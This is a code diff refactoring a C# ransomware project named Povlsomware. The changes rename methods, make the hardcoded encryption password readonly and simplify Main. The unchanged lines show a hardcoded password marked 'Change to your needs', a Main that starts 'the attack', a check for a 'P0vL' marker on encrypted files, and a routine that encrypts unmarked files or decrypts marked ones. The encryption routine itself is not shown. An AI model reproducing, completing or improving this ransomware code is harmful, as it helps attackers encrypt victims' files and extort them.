@@ -15,15 +15,15 @@ namespace Povlsomware
     {
         public static int count = 0;
         public static List<string> myFiles = new List<string>();
-        private static string password = "blahblah"; //The Encryption password. Change to your needs. 
+        private static readonly string password = "blahblah"; //The Encryption password. Change to your needs. 
 
         [STAThread]
-        public static string getPass()
+        public static string GetPass()
         {
             return password;
         }
 
-        static void Main(string[] args)
+        static void Main()
         {
             //Start the attack
             Attack();
@@ -157,7 +157,7 @@ namespace Povlsomware
         }
 
 
-        public static bool isMarked(string fileName)
+        public static bool IsMarked(string fileName)
         {
             byte[] mark = Encoding.ASCII.GetBytes("P0vL");
             byte[] firstFourBytes = File.ReadAllBytes(fileName).Take(4).ToArray();
@@ -173,7 +173,7 @@ namespace Povlsomware
         // For each found file do the following.
         public static void ProcessFile(string fileName, int action, string password)
         {
-            if (action == 1 && !isMarked(fileName))
+            if (action == 1 && !IsMarked(fileName))
             {
                 try
                 {
@@ -183,7 +183,7 @@ namespace Povlsomware
                 {
                 }
             }
-            else if (action == 0 && isMarked(fileName))
+            else if (action == 0 && IsMarked(fileName))
             {
                 try
                 {
